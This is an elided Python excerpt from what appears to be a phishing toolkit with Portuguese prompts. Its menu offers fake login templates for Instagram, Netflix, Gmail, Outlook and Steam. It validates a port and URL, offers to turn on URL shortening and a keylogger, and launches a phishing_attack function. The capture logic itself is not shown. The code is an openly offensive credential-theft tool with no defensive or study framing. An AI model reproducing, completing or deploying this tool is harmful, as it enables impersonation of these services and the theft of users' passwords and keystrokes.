...
def interface_grafica():
   ...
   global keylogger
   banner_program()
   print ("\n" + W + "[" + A + G + "01" + W + "]" + C + " instagram")
   print ("\n" + W + "[" + A + G + "02" + W + "]" + C + " netflix")
   print ("\n" + W + "[" + A + G + "03" + W + "]" + C + " gmail")
   print ("\n" + W + "[" + A + G + "04" + W + "]" + C + " outlook")
   print ("\n" + W + "[" + A + G + "05" + W + "]" + C + " steam")
   ...
   if (option == "1" or option == "01"):
     ...
     if (porta == 80 or porta == 22 or porta == 443):
       ...
       if (verificar_url == True):
         banner_program()
         escolha2 = str(input("\n" + W + "[" + A + G + "+" + W + "]" + C + " Deseja usar modo de Encurtar URL e Keylogger? : " + A + G))
         if (escolha2 == "sim" or escolha2 == "s" or escolha2 == "yes" or escolha2 == "y"):
           encurtar_url = "on"
           keylogger = "on"
           banner_program()
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
